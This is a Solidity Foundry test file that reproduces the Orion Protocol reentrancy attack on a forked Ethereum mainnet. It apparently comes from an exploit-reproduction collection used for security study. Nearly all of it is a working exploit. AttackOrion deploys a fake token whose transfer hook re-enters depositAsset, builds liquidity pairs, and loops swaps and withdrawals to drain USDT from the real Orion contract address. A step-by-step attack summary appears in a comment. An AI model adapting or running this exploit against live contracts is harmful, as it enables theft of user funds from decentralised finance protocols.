// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {CheatCodes} from "../../interfaces/00_CheatCodes.interface.sol";

import {ICompound} from '../../utils/ICompound.sol';
import {ICurve} from '../../utils/ICurve.sol';
import {IUniswapV2Pair} from '../../utils/IUniswapV2Pair.sol';

import {IERC20} from '../../interfaces/IERC20.sol';
import {IWETH9} from '../../interfaces/IWETH9.sol';


import "./ATT_ERC20.sol";

/*
Twitter comment
1. Create a fake token ATK which has a hook on transfer’) and add liquidity into uniswap
2. Deposit 0.5 USDC into Orion contract via depositAsset' )
3. Flashloan 191,606 USDT and call swapThroughOrionPool’) to swap USDC via path USDC, ATK, USDT, reentry from ATK transfer’) to depositAsset’/) to deposit 191,606 USDT
4. Withdraw 191,606 USDT
*/
interface OrionPoolV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface OrionPair {
    function mint(address to) external returns (uint liquidity);
}

interface Orion {
    function depositAsset(address asset, uint112 amount) external;
    function swapThroughOrionPool(uint112 amount_spend, uint112 amount_receive, address[] calldata path, bool is_exact_spend) external;
    function withdraw(address asset, uint112 amount) external;
}

contract AttackOrion is ATT_ERC20 {
    uint256 balance = 1;
    IERC20 private constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    OrionPoolV2Factory factory = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
    AttackOrion token;
    Orion orion = Orion(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
    uint112 initialAmount = 1 * 10**6;

    uint count = 0; 

    constructor() ATT_ERC20("ATK", "ATK") {}

    function perform() external {
        token = this;

        prankFunding();
        approvals();

        OrionPair a = OrionPair(factory.createPair(address(token), address(usdc)));
        OrionPair b = OrionPair(factory.createPair(address(token), address(usdt)));

        usdc.transfer(address(a),500000); 
        bytes memory d = abi.encodeWithSelector(usdt.transfer.selector, address(b), 5000000);
        address(usdt).call(d);
        d = abi.encodeWithSelector(usdt.transfer.selector, address(this), 1);
        address(usdt).call(d);
        token.mint(address(this), 10000000000);
        token.mint(address(a), 10000000000);
        token.mint(address(b), 10000000000);
        a.mint(address(this));
        b.mint(address(this));

        orion.depositAsset(address(usdc), 500000);

        printBalance("USDT before attack");
        address[] memory path = new address[](3);
        path[0] = address(usdc);
        path[1] = address(token);
        path[2] = address(usdt);
        
        uint256 initialGas = gasleft();
        uint112 amount = initialAmount;
        while (amount < 3000000000000) {
            if (amount > 3000000000000) {
                amount = 3000000000000;
            }
            orion.swapThroughOrionPool(10000, 0, path, true);
            orion.withdraw(address(usdt), amount);
            amount += amount;
        }
        uint256 finalGas = gasleft();
        console.log("Delta gas %s", initialGas - finalGas);

        printBalance("USDT after attack");
    }

    function prankFunding() internal {
        //Funding account with a few cents
        CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheat.prank(address(0x55FE002aefF02F77364de339a1292923A15844B8));
        usdc.transfer(address(this), 10000000); 
        bytes memory d = abi.encodeWithSelector(usdt.transfer.selector, address(this), 10000000);
        cheat.prank(0xA7A93fd0a276fc1C0197a5B5623eD117786eeD06);
        address(usdt).call(d);
    }

    function approvals() internal {
        address[] memory addresses = new address[](2);
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdt);
        tokens[1] = address(usdc);
        addresses[1] = address(orion);
        for (uint i = 0; i < addresses.length; i++) {
            address a = addresses[i];
            //USDT fails when calling approve, so we use a low level call
            bytes memory data = abi.encodeWithSelector(this.approve.selector, a, type(uint256).max);
            for (uint j = 0; j < tokens.length; j++) {
                address token = tokens[j];
                (bool success, bytes memory b) = token.call(data);
                if (!success) {
                    console.log("Not success %s %s", token, a);
                }
            }
        }
    }

    function mint(address addr, uint256 amount) external {
        _mint(addr, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override virtual {
        count++;
        if (count >= 4) {
            uint256 balance = usdt.balanceOf(address(this)); 
            orion.depositAsset(address(usdt), uint112(balance));
        }
    }

    function printBalance(string memory label) internal {
        console.log(label);
        console.log("%s", usdt.balanceOf(address(this)));
    }
}

contract Exploit_Orion is  TestHarness {

    function setUp() external {
        cheat.createSelectFork("mainnet", 16542147);
    }

    function test_attack() public {
        AttackOrion att = new AttackOrion();
        att.perform();
    }
}